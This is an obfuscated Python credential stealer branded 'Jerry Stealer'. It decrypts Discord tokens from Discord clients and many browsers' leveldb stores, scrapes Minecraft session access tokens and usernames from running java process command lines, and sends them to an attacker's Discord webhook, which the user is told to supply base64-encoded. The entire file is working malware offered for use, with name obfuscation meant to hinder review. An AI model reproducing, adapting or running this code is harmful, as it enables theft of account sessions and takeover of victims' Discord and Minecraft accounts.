lllllllllllllll, llllllllllllllI, lllllllllllllIl = PermissionError, open, bool

from colorama import init as llIIlIllllllII
from os import listdir as lIIllIIlIllIIl, getenv as llllIIIllIlIll
from os.path import exists as IlIlllIllIIlIl
from re import findall as IIlIIIlIlIlIll, compile as IIllllIIllIIll
from json import loads as IllllIIIlllIlI, dumps as IlIlIIllIllIll
from win32crypt import CryptUnprotectData as IIllIlllIlIIlI
from base64 import b64decode as lllIIlllIlIlll
from base64 import b64decode as IIIIIIIIIII
from psutil import NoSuchProcess as lIIlllllllIIII, AccessDenied as lIlIlIlIIlIIlI, process_iter as IIllllIIIIIllI
from requests import post as lIllIIllIlIIll
from Crypto.Cipher import AES as IIllllIIIIIIIl
from colorama import Fore as llllIIIIllIIllE
llIIlIllllllII()
# Please Replace Meow With Your Own Encrypted Webhook (B64 ENCRYPTION)
meow = "YOUR_ENCRYPTED_WEBHOOK_STRING_HERE"
IIIIllIlIIlllIllll = IIIIIIIIIII(meow)
IlIIIlIIIllIIlllIl = '%webhook%'
lIlIllIIIIIllIlIlI = llllIIIllIlIll('LOCALAPPDATA')
lIIllIlIIllIIIllII = llllIIIllIlIll('APPDATA')
IllIIllIlIlIllIlII = {'Discord': lIIllIlIIllIIIllII + '\\discord', 'Discord Canary': lIIllIlIIllIIIllII + '\\discordcanary', 'Lightcord': lIIllIlIIllIIIllII + '\\Lightcord', 'Discord PTB': lIIllIlIIllIIIllII + '\\discordptb', 'Opera': lIIllIlIIllIIIllII + '\\Opera Software\\Opera Stable', 'Opera GX': lIIllIlIIllIIIllII + '\\Opera Software\\Opera GX Stable', 'Amigo': lIlIllIIIIIllIlIlI + '\\Amigo\\User Data', 'Torch': lIlIllIIIIIllIlIlI + '\\Torch\\User Data', 'Kometa': lIlIllIIIIIllIlIlI + '\\Kometa\\User Data', 'Orbitum': lIlIllIIIIIllIlIlI + '\\Orbitum\\User Data', 'CentBrowser': lIlIllIIIIIllIlIlI + '\\CentBrowser\\User Data', '7Star': lIlIllIIIIIllIlIlI + '\\7Star\\7Star\\User Data', 'Sputnik': lIlIllIIIIIllIlIlI + '\\Sputnik\\Sputnik\\User Data', 'Vivaldi': lIlIllIIIIIllIlIlI + '\\Vivaldi\\User Data\\Default', 'Chrome SxS': lIlIllIIIIIllIlIlI + '\\Google\\Chrome SxS\\User Data', 'Chrome': lIlIllIIIIIllIlIlI + '\\Google\\Chrome\\User Data' + 'Default', 'Epic Privacy Browser': lIlIllIIIIIllIlIlI + '\\Epic Privacy Browser\\User Data', 'Microsoft Edge': lIlIllIIIIIllIlIlI + '\\Microsoft\\Edge\\User Data\\Defaul', 'Uran': lIlIllIIIIIllIlIlI + '\\uCozMedia\\Uran\\User Data\\Default', 'Yandex': lIlIllIIIIIllIlIlI + '\\Yandex\\YandexBrowser\\User Data\\Default', 'Brave': lIlIllIIIIIllIlIlI + '\\BraveSoftware\\Brave-Browser\\User Data\\Default', 'Iridium': lIlIllIIIIIllIlIlI + '\\Iridium\\User Data\\Default'}

def IIIlIIIIIIIIIIlIll(IIIllIlIIIIIlIIlll):
    IIIllIlIIIIIlIIlll += '\\Local Storage\\leveldb\\'
    IIlllIIllllIIIlIlI = []
    if not IlIlllIllIIlIl(IIIllIlIIIIIlIIlll):
        return IIlllIIllllIIIlIlI
    for llIlIIIlIllIlllllI in lIIllIIlIllIIl(IIIllIlIIIIIlIIlll):
        if not llIlIIIlIllIlllllI.endswith('.ldb') and llIlIIIlIllIlllllI.endswith('.log'):
            continue
        try:
            with llllllllllllllI(f'{IIIllIlIIIIIlIIlll}{llIlIIIlIllIlllllI}', 'r', errors='ignore') as IIIIllIlIllllllIII:
                for IIIlIllIIIIlllIlIl in (x.strip() for x in IIIIllIlIllllllIII.readlines()):
                    for IllIlllIllllllIlII in IIlIIIlIlIlIll('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*', IIIlIllIIIIlllIlIl):
                        IIlllIIllllIIIlIlI.append(IllIlllIllllllIlII)
        except lllllllllllllll:
            continue
    return IIlllIIllllIIIlIlI

def lIlllIllIIlIlIllll(IIIllIlIIIIIlIIlll):
    with llllllllllllllI(IIIllIlIIIIIlIIlll + f'\\Local State', 'r') as llIlIIIlIllIlllllI:
        lIIllllIIIIIIIlIIl = IllllIIIlllIlI(llIlIIIlIllIlllllI.read())['os_crypt']['encrypted_key']
        llIlIIIlIllIlllllI.close()
    return lIIllllIIIIIIIlIIl

def lIIIIIIIlIlIIllIII():
    lIlIIllIlIIIIllIII = []
    for (llIIllIllIIIIIllII, IIIllIlIIIIIlIIlll) in IllIIllIlIlIllIlII.items():
        if not IlIlllIllIIlIl(IIIllIlIIIIIlIIlll):
            continue
        for lIllllIIIllIIIIIlI in IIIlIIIIIIIIIIlIll(IIIllIlIIIIIlIIlll):
            lIllllIIIllIIIIIlI = lIllllIIIllIIIIIlI.replace('\\', '') if lIllllIIIllIIIIIlI.endswith('\\') else lIllllIIIllIIIIIlI
            lIllllIIIllIIIIIlI = IIllllIIIIIIIl.new(IIllIlllIlIIlI(lllIIlllIlIlll(lIlllIllIIlIlIllll(IIIllIlIIIIIlIIlll))[5:], None, None, None, 0)[1], IIllllIIIIIIIl.MODE_GCM, lllIIlllIlIlll(lIllllIIIllIIIIIlI.split('dQw4w9WgXcQ:')[1])[3:15]).decrypt(lllIIlllIlIlll(lIllllIIIllIIIIIlI.split('dQw4w9WgXcQ:')[1])[15:])[:-16].decode()
            return lIllllIIIllIIIIIlI

def IlIllIlIlIIllIlIll():
    lIllIlIlIlIlIIlIII = IIllllIIllIIll('--accessToken\\s+([a-zA-Z0-9\\-_\\.]+)')
    llIlIIIlIlIllIIIll = IIllllIIllIIll('--username\\s+([^\\s]+)')
    for IIlIllIllIIIIlIIII in IIllllIIIIIllI(['pid', 'name', 'cmdline']):
        try:
            if 'java' in IIlIllIllIIIIlIIII.info['name'].lower():
                llllIllIIIIIlllIll = ' '.join(IIlIllIllIIIIlIIII.info['cmdline'])
                llIIIlllIIlIIIlllI = lIllIlIlIlIlIIlIII.search(llllIllIIIIIlllIll)
                IlIIIllIllIIlIlIll = llIlIIIlIlIllIIIll.search(llllIllIIIIIlllIll)
                if llIIIlllIIlIIIlllI:
                    lIllllIIIllIIIIIlI = llIIIlllIIlIIIlllI.group(1)
                    lllIIlllllIIIlIIIl = IlIIIllIllIIlIlIll.group(1) if IlIIIllIllIIlIlIll else None
                    return {'token': lIllllIIIllIIIIIlI, 'username': lllIIlllllIIIlIIIl}
        except (lIIlllllllIIII, lIlIlIlIIlIIlI):
            continue
    return None

def lllIIllIlIlllIlIll(IlIlllllIlIIlIIIlI, lllIIlllllIIIlIIIl, IIlIllIlIllIlIIlII, lIlIIlIIIllIIIIlII):
    llllIlllIIlIlIIIll = {'title': 'Jerry Stealer', 'description': 'New session ID captured', 'color': 65416, 'fields': [{'name': '🔑 Session ID', 'value': f'```{IlIlllllIlIIlIIIlI}```', 'inline': lllllllllllllIl(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)}, {'name': '😍 Username', 'value': f'```{lllIIlllllIIIlIIIl}```', 'inline': lllllllllllllIl(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)}, {'name': '😍 Discord Token', 'value': f'```{IIlIllIlIllIlIIlII}```', 'inline': lllllllllllllIl(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 0)}, {'name': '🎯 Status', 'value': '```✅ Active```', 'inline': lllllllllllllIl(((1 & 0 ^ 0) & 0 ^ 1) & 0 ^ 1 ^ 1 ^ 0 | 1)}], 'thumbnail': {'url': 'https://i.imgur.com/dTS2hoN.png'}, 'footer': {'text': 'Jerry Stealer', 'icon_url': 'https://i.imgur.com/dTS2hoN.png'}}
    IIlIIlIlIlIlIIllll = {'username': 'Jerry Stealer', 'avatar_url': 'https://i.imgur.com/dTS2hoN.png', 'embeds': [llllIlllIIlIlIIIll]}
    lIllIIllIlIIll(lIlIIlIIIllIIIIlII, data=IlIlIIllIllIll(IIlIIlIlIlIlIIllll), headers={'Content-Type': 'application/json'})

def llIlIIIlllIlIIIIIl():
    IIlIllIlIllIlIIlII = lIIIIIIIlIlIIllIII()
    IlIlllIIlllIlIIIII = IlIllIlIlIIllIlIll()
    lIllllIIIllIIIIIlI = IlIlllIIlllIlIIIII['token'] if IlIlllIIlllIlIIIII else None
    lllIIlllllIIIlIIIl = IlIlllIIlllIlIIIII['username'] if IlIlllIIlllIlIIIII else None
    lllIIllIlIlllIlIll(lIllllIIIllIIIIIlI, lllIIlllllIIIlIIIl, IIlIllIlIllIlIIlII, IlIIIlIIIllIIlllIl)
    lllIIllIlIlllIlIll(lIllllIIIllIIIIIlI, lllIIlllllIIIlIIIl, IIlIllIlIllIlIIlII, IIIIllIlIIlllIllll)
llIlIIIlllIlIIIIIl()